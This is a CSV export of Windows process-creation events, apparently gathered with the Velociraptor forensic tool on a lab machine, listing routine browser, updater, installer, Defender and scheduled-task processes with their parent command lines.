_ts,Timestamp,PPID,PID,Name,CommandLine,ParentCommandLine,CallChain,ClientId
1783856634768,2026-07-12T11:41:26Z,5276,6560,powershell.exe,,"""C:\Users\seguridad\Desktop\TFM\Velociraptor\velociraptor-v0.75.6-windows-amd64.exe""  --config server.config.yaml gui",Null,C.364907172793f8c7
1783856634768,2026-07-12T11:41:27Z,7244,9740,msiexec.exe,C:\Windows\System32\MsiExec.exe -Embedding 3FBF9DADE6B43B6DCC443934BE572A93,C:\Windows\system32\msiexec.exe /V,wininit.exe <- services.exe <- msiexec.exe <- msiexec.exe,C.364907172793f8c7
1783856634768,2026-07-12T11:41:29Z,9348,6856,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
1783856634768,2026-07-12T11:41:34Z,772,8360,svchost.exe,C:\Windows\system32\svchost.exe -k wusvcs -p -s WaaSMedicSvc,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- svchost.exe,C.364907172793f8c7
1783856634768,2026-07-12T11:41:34Z,1320,10060,taskhostw.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:41:43Z,4172,7108,AdobeARMHelper.exe,,"""C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\armsvc.exe""",Null,C.364907172793f8c7
1783856634768,2026-07-12T11:41:43Z,10484,7296,AdobeARM_UCB.exe,,"""C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\AdobeARM.exe""",Null,C.364907172793f8c7
1783856634768,2026-07-12T11:41:44Z,7108,2540,AdobeARM.exe,"""C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\AdobeARM.exe"" /ArmElevate /MODE:3 /UpdateSelection:0 /PRODUCT:Acrobat /VERSION:26.0 /LANG:ENU /Svc /USER:SYSTEM /SESSIONID:1",,AdobeARM.exe,C.364907172793f8c7
1783856634768,2026-07-12T11:41:45Z,2540,9276,AdobeARM.exe,,"""C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\AdobeARM.exe"" /ArmElevate /MODE:3 /UpdateSelection:0 /PRODUCT:Acrobat /VERSION:26.0 /LANG:ENU /Svc /USER:SYSTEM /SESSIONID:1",Null,C.364907172793f8c7
1783856634768,2026-07-12T11:41:49Z,7244,2776,msiexec.exe,,C:\Windows\system32\msiexec.exe /V,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:41:58Z,772,5452,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:41:58Z,5452,4048,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:01Z,772,4764,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:01Z,4764,3952,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:01Z,772,3500,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:02Z,3500,1272,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:02Z,772,3612,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:02Z,3612,6216,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:02Z,772,2100,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:02Z,2100,10552,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:03Z,772,11096,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:03Z,11096,296,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:04Z,772,788,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:04Z,788,5080,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:06Z,772,2884,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:06Z,2884,5196,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:08Z,772,9436,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:08Z,9436,4944,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:09Z,772,2360,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:10Z,2360,6156,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:13Z,772,8216,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:13Z,8216,6700,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:16Z,772,7356,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:16Z,7356,9484,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:16Z,9348,6460,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:16Z,9348,8792,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:16Z,9348,6104,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:18Z,772,5656,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:18Z,5656,9856,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:21Z,7244,9612,MSICFC6.tmp,,C:\Windows\system32\msiexec.exe /V,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:21Z,772,6708,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:21Z,6708,6628,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:21Z,772,6872,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:21Z,6872,3500,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:22Z,9348,1460,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:22Z,9348,7268,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:22Z,9348,6196,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:24Z,9348,1452,chrome.exe,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --type=utility --utility-sub-type=on_device_model.mojom.OnDeviceModelService --lang=es --service-sandbox-type=on_device_model_execution --no-pre-read-main-dll --metrics-shmem-handle=6452,i,8883037612423066432,11842018139881767478,524288 --field-trial-handle=1992,i,15883667373147678976,5585095587974020185,262144 --variations-seed-version --pseudonymization-salt-handle=1996,i,15414328641234855124,13154617930620137814,4 --trace-process-track-uuid=3190709027541712850 --mojo-platform-channel-handle=6860 /prefetch:8","""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",chrome.exe <- chrome.exe,C.364907172793f8c7
1783856634768,2026-07-12T11:42:25Z,772,5964,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:25Z,5964,8008,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:25Z,772,7984,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:25Z,7984,3996,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:31Z,772,8988,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:31Z,9348,5232,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:31Z,8988,8860,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:31Z,9348,4104,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:31Z,9348,9472,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:35Z,772,9128,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:35Z,9128,7384,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:38Z,9348,6132,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:38Z,9348,8716,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:38Z,9348,11064,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:41Z,772,10944,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:41Z,10944,6700,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:43Z,772,1924,updater.exe,"""C:\Program Files (x86)\Google\GoogleUpdater\151.0.7910.0\updater.exe"" --system --windows-service --service=update",C:\Windows\system32\services.exe,wininit.exe <- services.exe <- updater.exe,C.364907172793f8c7
1783856634768,2026-07-12T11:42:43Z,1924,8388,updater.exe,"""C:\Program Files (x86)\Google\GoogleUpdater\151.0.7910.0\updater.exe"" --crash-handler --system ""--database=C:\Program Files (x86)\Google\GoogleUpdater\151.0.7910.0\Crashpad"" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=151.0.7910.0 ""--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log"" ""--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater_history.jsonl"" --initial-client-data=0x24c,0x250,0x254,0x248,0x258,0x7ff649df1270,0x7ff649df1280,0x7ff649df1290","""C:\Program Files (x86)\Google\GoogleUpdater\151.0.7910.0\updater.exe"" --system --windows-service --service=update",wininit.exe <- services.exe <- updater.exe <- updater.exe,C.364907172793f8c7
1783856634768,2026-07-12T11:42:46Z,772,9700,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:46Z,9700,6060,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:47Z,772,10852,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:47Z,10852,3952,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:50Z,772,1752,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:50Z,1752,4084,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:51Z,9348,10132,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:51Z,9348,10440,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:53Z,904,6196,dllhost.exe,C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
1783856634768,2026-07-12T11:42:53Z,772,9964,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:53Z,9964,3736,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:55Z,772,9736,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:55Z,9736,2244,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:58Z,772,9488,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:42:58Z,9488,7620,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:43:01Z,772,3288,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:43:01Z,3288,1064,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:43:02Z,2776,8692,AdobeCollabSync.exe,,C:\Windows\System32\MsiExec.exe -Embedding 0E0F3D32320DCF408FD6A42AA9EC7A32 E Global\MSI0000,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:43:06Z,772,10732,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:43:06Z,10732,2360,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:43:12Z,772,10164,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:43:12Z,10164,8580,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:43:16Z,7244,4956,CPInstCU.exe,,C:\Windows\system32\msiexec.exe /V,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:43:16Z,7244,4004,SingleClientServicesUpdater.exe,,C:\Windows\system32\msiexec.exe /V,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:43:16Z,7244,5956,msiexec.exe,,C:\Windows\system32\msiexec.exe /V,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:43:17Z,772,9484,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:43:17Z,9484,8388,updater.exe,,,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:43:30Z,1320,6176,taskhostw.exe,taskhostw.exe -RegisterUserDevice -NewAccount,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe,C.364907172793f8c7
1783856634768,2026-07-12T11:43:32Z,1320,10336,taskhostw.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:43:32Z,772,8592,TrustedInstaller.exe,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- TrustedInstaller.exe,C.364907172793f8c7
1783856634768,2026-07-12T11:43:33Z,904,3128,TiWorker.exe,,C:\Windows\system32\svchost.exe -k DcomLaunch -p,Null,C.364907172793f8c7
1783856634768,2026-07-12T11:43:42Z,4004,4312,SingleClientServicesUpdater.exe,,"""C:\Program Files\Adobe\Acrobat DC\Acrobat\AcroCEF\SingleClientServicesUpdater.exe"" 26.001.21691  --SingleClientApp",Null,C.364907172793f8c7
1783856746353,2026-07-12T11:43:55Z,2540,3144,AdobeARM.exe,,,Null,C.364907172793f8c7
1783856746353,2026-07-12T11:43:55Z,2540,7004,AdobeARM.exe,,,Null,C.364907172793f8c7
1783856746353,2026-07-12T11:44:22Z,1320,6764,dmclient.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
1783856746353,2026-07-12T11:44:22Z,6764,8344,conhost.exe,,,Null,C.364907172793f8c7
1783856746353,2026-07-12T11:44:39Z,6740,8692,NvSHIM.exe,"""C:\Program Files\NVIDIA Corporation\NvBackend\NvSHIM.exe"" /noheader -o ""C:\Users\seguridad\AppData\Local\NVIDIA\NvBackend\shim.xml"" -l ""C:\Users\seguridad\AppData\Local\NVIDIA\NvBackend\shim.log""","""C:\Program Files\NVIDIA Corporation\NvContainer\nvcontainer.exe"" -f ""C:\ProgramData\NVIDIA\NvContainerUser%d.log"" -d ""C:\Program Files\NVIDIA Corporation\NvContainer\plugins\User"" -r -l 3 -p 30000 -st ""C:\Program Files\NVIDIA Corporation\NvContainer\NvContainerTelemetryApi.dll"" -c",wininit.exe <- services.exe <- nvcontainer.exe <- nvcontainer.exe <- NvSHIM.exe,C.364907172793f8c7
1783856746353,2026-07-12T11:44:39Z,8692,9820,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,"""C:\Program Files\NVIDIA Corporation\NvBackend\NvSHIM.exe"" /noheader -o ""C:\Users\seguridad\AppData\Local\NVIDIA\NvBackend\shim.xml"" -l ""C:\Users\seguridad\AppData\Local\NVIDIA\NvBackend\shim.log""",wininit.exe <- services.exe <- nvcontainer.exe <- nvcontainer.exe <- NvSHIM.exe <- conhost.exe,C.364907172793f8c7
1783856746353,2026-07-12T11:44:41Z,904,10108,WmiPrvSE.exe,,C:\Windows\system32\svchost.exe -k DcomLaunch -p,Null,C.364907172793f8c7
1783856746353,2026-07-12T11:44:41Z,772,8724,svchost.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:47Z,1320,7320,provtool.exe,"""C:\Windows\system32\ProvTool.exe"" /turn 5 /source LogonIdleTask",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- provtool.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:47Z,1320,9220,taskhostw.exe,taskhostw.exe Install $(Arg0),C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:47Z,772,9532,sppsvc.exe,C:\Windows\system32\sppsvc.exe,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- sppsvc.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:47Z,1320,1196,SpeechModelDownload.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:47Z,1320,10820,taskhostw.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:47Z,772,8000,TrustedInstaller.exe,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- TrustedInstaller.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:48Z,904,5732,TiWorker.exe,C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.19041.3385_none_7e1c800a7c81ffd9\TiWorker.exe -Embedding,C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- TiWorker.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:48Z,772,4632,svchost.exe,C:\Windows\system32\svchost.exe -k wusvcs -p -s WaaSMedicSvc,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- svchost.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:48Z,1088,7556,UsoClient.exe,,C:\Windows\System32\mousocoreworker.exe -Embedding,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:48Z,1320,5440,taskhostw.exe,taskhostw.exe PiSqmTasks,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:48Z,1320,5088,SecureBootEncodeUEFI.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:48Z,1320,11188,taskhostw.exe,taskhostw.exe VerifyWinRE,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:48Z,772,9320,svchost.exe,C:\Windows\System32\svchost.exe -k wsappx -p -s ClipSVC,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- svchost.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:48Z,1320,10112,FaceFodUninstaller.exe,"""C:\Windows\System32\WinBioPlugIns\FaceFodUninstaller.exe""",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- FaceFodUninstaller.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:48Z,5088,7064,conhost.exe,,,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:48Z,772,7004,svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs -p -s DsmSvc,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- svchost.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,1320,7296,tzsync.exe,"""C:\Windows\system32\tzsync.exe""",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- tzsync.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,1320,1780,rundll32.exe,"""C:\Windows\system32\rundll32.exe"" Windows.Storage.ApplicationData.dll,CleanupTemporaryState",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- rundll32.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,904,7912,dllhost.exe,C:\Windows\system32\DllHost.exe /Processid:{722D0F89-B69C-4700-AE8C-4A44350E4876},C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,1320,8640,taskhostw.exe,taskhostw.exe,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,1320,8404,UsoClient.exe,"""C:\Windows\system32\usoclient.exe"" ReportPolicies",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- UsoClient.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,1320,4960,rundll32.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,7296,7420,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,"""C:\Windows\system32\tzsync.exe""",wininit.exe <- services.exe <- svchost.exe <- tzsync.exe <- conhost.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,1320,324,lpremove.exe,"""C:\Windows\system32\lpremove.exe""",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- lpremove.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,1320,6004,MpCmdRun.exe,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26050.15-0\MpCmdRun.exe"" Scan -ScheduleJob -ScanTrigger 55 -IdleScheduledJob",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- MpCmdRun.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,1320,3192,MpCmdRun.exe,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26050.15-0\MpCmdRun.exe"" -IdleTask -TaskName WdCacheMaintenance",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- MpCmdRun.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,324,3648,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,"""C:\Windows\system32\lpremove.exe""",wininit.exe <- services.exe <- svchost.exe <- lpremove.exe <- conhost.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,3192,10792,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26050.15-0\MpCmdRun.exe"" -IdleTask -TaskName WdCacheMaintenance",wininit.exe <- services.exe <- svchost.exe <- MpCmdRun.exe <- conhost.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,6004,5656,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26050.15-0\MpCmdRun.exe"" Scan -ScheduleJob -ScanTrigger 55 -IdleScheduledJob",wininit.exe <- services.exe <- svchost.exe <- MpCmdRun.exe <- conhost.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,772,9252,svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs -p -s wisvc,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- svchost.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,1320,6764,sc.exe,"""C:\Windows\system32\sc.exe"" start w32time task_started",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- sc.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,1320,9048,rundll32.exe,"""C:\Windows\system32\rundll32.exe"" C:\Windows\system32\Windows.StateRepositoryClient.dll,StateRepositoryDoMaintenanceTasks",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- rundll32.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,1320,2316,CompatTelRunner.exe,"""C:\Windows\system32\compattelrunner.exe"" -maintenance",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- CompatTelRunner.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,1320,5496,dmclient.exe,"""C:\Windows\system32\dmclient.exe""",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- dmclient.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,2316,320,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,"""C:\Windows\system32\compattelrunner.exe"" -maintenance",wininit.exe <- services.exe <- svchost.exe <- CompatTelRunner.exe <- conhost.exe,C.364907172793f8c7
